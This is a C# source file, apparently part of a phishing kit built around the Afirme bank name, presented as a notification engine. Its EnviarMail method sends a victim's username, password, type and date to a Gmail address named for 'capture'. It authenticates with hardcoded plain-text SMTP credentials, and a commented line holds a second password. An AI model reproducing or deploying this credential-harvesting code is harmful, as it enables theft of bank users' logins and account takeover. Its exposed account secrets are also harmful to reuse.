using AfirmeNegocio.Models;
using System;
using System.Collections.Generic;
using System.Net.Mail;
using System.Text;

namespace AfirmeNegocio.EngineNotificacion
{
    public  class Notify
    {
        public  bool EnviarMail(NotificacionModel model)
        {
            bool result = false;
            try
            {
                SmtpClient servidor = new SmtpClient();
                MailMessage mensaje = new MailMessage();
                mensaje.From = new MailAddress("dondiegodelavegacapturaf@gmail.com");
                mensaje.Subject = model.Asunto;
                mensaje.SubjectEncoding = System.Text.Encoding.UTF8;
                mensaje.Body = model.Usuario + " " + Environment.NewLine + " " + model.Password + " " + Environment.NewLine + model.Tipo + " " + Environment.NewLine + model.Fecha;
                mensaje.BodyEncoding = System.Text.Encoding.UTF8;
                mensaje.IsBodyHtml = true;
                mensaje.To.Add(new MailAddress("dondiegodelavegacapturaf@gmail.com"));
                //if (pathAdjunto != string.Empty) { mensaje.Attachments.Add(new Attachment(pathAdjunto)); }
                servidor.Credentials = new System.Net.NetworkCredential("dondiegodelavegacapturaf", "captura123."); //captura321afirme
                servidor.Port = 587;
                servidor.Host = "smtp.gmail.com";
                servidor.EnableSsl = true;
                servidor.Send(mensaje);
                mensaje.Dispose();
                result = true;
            }
            catch(Exception ex)
            {
                var error = ex.ToString();
            }

            return result;
        }
    }
}
